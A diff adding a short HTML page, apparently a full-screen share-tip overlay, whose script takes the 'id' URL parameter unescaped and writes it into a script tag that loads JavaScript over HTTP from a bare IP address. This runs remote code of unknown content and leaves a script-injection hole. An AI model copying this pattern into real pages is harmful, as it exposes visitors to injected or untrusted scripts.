@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title></title>
+<style>
+        .share {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 200;
+            width: 100%;
+            height: 100%;
+            color: #fff;
+            background: rgba(0, 0, 0, .75);
+        }
+
+        .share img {
+            float: right;
+            width: 100%;
+            margin: 10px;
+        }
+
+        .share p {
+            padding: 0 10px;
+        }
+    </style>
+<script type="text/javascript">
+        function GetQueryString(name) {
+            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)","i");
+            var r = window.location.search.substr(1).match(reg);
+            if (r!=null) return (r[2]); return null;
+        }
+</script>
+</head>
+<body>
+<div style="width: 100%;height: 50px"></div>
+<div class="share" id="tips">
+    <img src="http://o8c5olbmo.b0.upaiyun.com/2016041401.png">
+</div>
+<script type="text/javascript">
+      var id = GetQueryString('id');
+      document.writeln('<script src="http://115.28.4.221/js/getjs?id='+id+'"><\/script>');
+</script>
+</body>
+</html>
